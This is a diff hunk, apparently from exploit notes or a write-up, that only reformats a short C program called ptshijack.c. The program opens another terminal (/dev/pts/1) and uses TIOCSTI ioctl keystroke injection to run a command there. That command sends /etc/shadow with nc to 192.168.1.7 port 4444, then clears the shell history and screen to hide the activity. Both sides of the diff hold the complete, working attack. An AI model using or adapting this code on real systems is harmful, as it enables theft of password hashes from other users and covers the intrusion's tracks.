@@ -23,22 +23,26 @@ Compile the following C code on (B) as `ptshijack.c` to get `/etc/shadow` from (
 
 // gcc ptshijack.c -o ptshijack
 
-int main() {
-    int fd = open("/dev/pts/1", O_RDWR);
-    if (fd < 0) {
-        perror("open");
-        return -1;
-    }
-    // your commands to execute go here.
-    char *x = "(cat /etc/shadow | nc 192.168.1.7 4444) &\nhistory -c\nclear\n";
-    while (*x != 0) {
-        int ret = ioctl(fd, TIOCSTI, x);
-        if (ret == -1) {
-            perror("ioctl()");
-        }
-        x++;
-    }
-    return 0;
+int main()
+{
+   int fd = open("/dev/pts/1", O_RDWR);
+   if(fd < 0)
+   {
+      perror("open");
+      return -1;
+   }
+   // your commands to execute go here.
+   char *x = "(cat /etc/shadow | nc 192.168.1.7 4444) &\nhistory -c\nclear\n";
+   while(*x != 0)
+   {
+      int ret = ioctl(fd, TIOCSTI, x);
+      if(ret == -1)
+      {
+         perror("ioctl()");
+      }
+      x++;
+   }
+   return 0;
 }
 ```
 
